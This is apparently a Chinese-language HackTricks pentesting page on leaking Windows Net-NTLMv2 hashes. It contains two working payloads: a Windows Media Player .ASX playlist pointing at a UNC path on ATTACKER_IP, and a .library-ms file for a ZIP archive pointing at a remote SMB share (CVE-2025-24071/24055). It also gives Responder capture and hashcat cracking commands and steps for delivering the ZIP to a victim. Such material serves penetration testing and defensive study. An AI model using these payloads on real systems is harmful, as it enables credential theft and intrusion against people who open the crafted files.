# 窃取 NTLM creds 的位置

{{#include ../../banners/hacktricks-training.md}}

**查看来自 [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) 的所有精彩想法，从在线下载 microsoft word 文件到 ntlm leaks 源: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md 和 [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player 播放列表 (.ASX/.WAX)

如果你能让目标打开或预览你控制的 Windows Media Player 播放列表，你可以通过将条目指向 UNC 路径来 leak Net‑NTLMv2。WMP 会尝试通过 SMB 获取引用的媒体并进行隐式认证。

示例 payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
收集和破解流程：
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### 嵌入 ZIP 的 .library-ms NTLM 泄露 (CVE-2025-24071/24055)

当从 ZIP 存档内直接打开 .library-ms 文件时，Windows 资源管理器会不安全地处理它们。如果库定义指向远程 UNC 路径（例如 \\attacker\share），仅在 ZIP 中浏览/启动该 .library-ms 就会导致资源管理器枚举该 UNC 并向攻击者发出 NTLM 认证。这会产生可离线破解或可能被中继的 NetNTLMv2。

最小 .library-ms 示例，指向攻击者 UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
操作步骤
- 使用上面的 XML 创建 .library-ms 文件（设置你的 IP/hostname）。
- 将其压缩（在 Windows: Send to → Compressed (zipped) folder）并将 ZIP 交付给目标。
- 运行 NTLM capture listener，并等待受害者从 ZIP 内打开 .library-ms。


## References
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)


{{#include ../../banners/hacktricks-training.md}}
